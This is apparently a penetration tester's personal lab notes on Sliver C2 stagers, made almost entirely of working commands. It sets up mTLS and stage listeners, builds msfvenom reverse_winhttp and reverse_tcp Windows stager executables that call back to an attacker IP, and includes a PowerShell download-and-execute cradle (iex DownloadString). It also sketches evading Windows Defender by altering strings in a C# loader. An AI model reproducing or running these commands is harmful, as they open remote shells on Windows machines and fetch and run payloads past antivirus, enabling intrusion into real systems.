# Stagers

```bash
# MSF Venom for boxes
mtls -L 192.168.45.163 -l 8888
profiles new --mtls 192.168.45.163 --format shellcode win-shellcode
stage-listener --url http://192.168.45.163:1234 --profile win-shellcode
msfvenom -p windows/x64/custom/reverse_winhttp LHOST=192.168.45.163 LPORT=1234 LURI=/hello.woff -f exe -o stager.exe
cmd.exe stager.exe


## REDONE
# Real Scenario based on https://www.youtube.com/watch?v=3uHNyTZvbqs
mtls -L 192.168.45.163 -l 9900
profiles new --mtls 192.168.45.163:9900 -l -f shellcode m_shellcode
stage-listener -u http://192.168.45.163:9443 -p m_shellcode
stage-listener -u tcp://192.168.45.163:1234 -p m_shellcode
msfvenom -p windows/x64/custom/reverse_winhttp LHOST=192.168.45.163 LPORT=9443 LURI=/hello.woff -f exe -o http.exe
msfvenom -p windows/x64/custom/reverse_tcp LHOST=192.168.45.163 LPORT=1234 -f exe -o tcp.exe

# bypassing defender
1. Use sliver docs custom C# script and change strings so it does not have signature checks

# Need to do stagers beacons from video above

# Need to play with powershell
iex (New-Object Net.WebClient).DownloadString("http://192.168.45.163/stager.ps1")
```

# Stagers revisited
